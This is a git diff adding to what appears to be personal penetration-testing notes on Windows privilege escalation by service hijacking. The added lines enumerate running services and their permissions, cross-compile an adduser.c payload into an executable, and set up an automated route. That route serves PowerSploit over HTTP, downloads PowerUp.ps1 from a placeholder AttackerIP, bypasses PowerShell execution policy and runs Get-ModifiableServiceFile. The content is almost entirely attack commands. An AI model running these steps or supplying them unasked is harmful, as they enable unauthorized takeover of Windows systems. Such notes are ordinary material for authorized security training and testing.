@@ -96,7 +96,15 @@ Tools:
 
 ## Services
 
+```
+Get-CimInstance -ClassName win32_service | Select Name, StartMode, State, PathName | Where-Object {$_.State -like 'Running'}
+Get_ACL
+icacls
+```
+
 ### Hijacking
+
+#### Manual
 
 ```
 #include <stdlib.h>
@@ -110,5 +118,23 @@ int main ()
   
   return 0;
 }
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
+
+#### Auto
+
+```
+cd /usr/share/windows-resources/powersploit/Privesc/
+python3 -m http.server 80
+
+iwr -uri http://AttackerIP/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
+
+
+
 
